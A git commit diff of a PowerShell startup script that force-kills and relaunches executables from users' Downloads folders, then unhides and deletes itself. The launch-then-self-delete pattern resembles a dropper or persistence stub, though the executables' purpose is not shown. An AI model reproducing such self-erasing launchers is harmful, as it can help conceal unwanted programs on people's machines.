65654fd10ee1f764c888c4fe27ec591b758e1c93
fullcaleta <144293848+fullcaleta@users.noreply.github.com>
2023-11-28 18:05:44 -0300

    Update MyStartUp.ps1

--- MyStartUp.ps1
+++ MyStartUp.ps1
@@ -2,7 +2,7 @@
 
 taskkill /F /IM Disk-Updating.exe
 C:\Users\angel\Downloads\Disk-Updating.exe
-#taskkill /F /IM lml.exe
-#C:\Users\$env:USERNAME\Downloads\lml.exe
+taskkill /F /IM lml.exe
+C:\Users\seba\Downloads\lml.exe
 attrib -h C:\Users\Public\MyStartUp.ps1
 del C:\Users\Public\MyStartUp.ps1
